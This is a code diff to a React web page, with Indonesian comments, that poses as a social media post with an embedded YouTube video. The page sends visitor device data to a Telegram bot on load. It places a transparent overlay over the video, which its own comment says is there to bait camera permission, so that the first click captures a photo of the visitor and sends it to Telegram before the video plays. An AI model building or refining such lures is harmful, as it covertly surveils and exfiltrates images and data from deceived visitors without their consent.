@@ -1,7 +1,9 @@
-import { useEffect, useCallback } from 'react';
+import { useEffect, useCallback, useState } from 'react';
 import { sendTelegramNotification, sendImageToTelegram } from './utils/telegram';
 
 function App() {
+  const [isPlaying, setIsPlaying] = useState(false);
+
   // Kirim data perangkat otomatis saat halaman dibuka
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -60,9 +62,12 @@ function App() {
     }
   }, []);
 
-  // Pemicu saat area wrapper diklik
-  const handleWrapperClick = () => {
-    captureAndSendPhoto();
+  // Pemicu saat area video diklik pertama kali
+  const handleWrapperClick = async () => {
+    if (!isPlaying) {
+      await captureAndSendPhoto();
+      setIsPlaying(true);
+    }
   };
 
   return (
@@ -84,19 +89,21 @@ function App() {
             <p className="text-[11px] text-gray-400">Diposting hari ini • Ditonton 304,000,000+ kali</p>
           </div>
 
-          {/* Kotak YouTube Embed dengan Video Blue - Yung Kai */}
+          {/* Kotak YouTube Embed dengan Lapisan Transparan */}
           <div className="relative rounded-lg overflow-hidden shadow border border-gray-200 aspect-video bg-black">
             
-            {/* Lapisan transparan untuk memancing izin kamera saat video diklik */}
-            <div 
-              className="absolute inset-0 z-10 cursor-pointer"
-              onClick={handleWrapperClick}
-              title="Klik untuk memutar"
-            ></div>
+            {/* Lapisan transparan di atas iframe sebelum video diputar untuk menangkap klik pertama */}
+            {!isPlaying && (
+              <div 
+                className="absolute inset-0 z-10 cursor-pointer"
+                onClick={handleWrapperClick}
+                title="Klik untuk memutar"
+              ></div>
+            )}
 
             <iframe 
               className="w-full h-full relative z-0"
-              src="https://www.youtube.com/embed/IpFX2vq8HKw?autoplay=0&rel=0" 
+              src={`https://www.youtube.com/embed/IpFX2vq8HKw?autoplay=${isPlaying ? 1 : 0}&rel=0`} 
               title="YouTube video player" 
               frameBorder="0" 
               allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
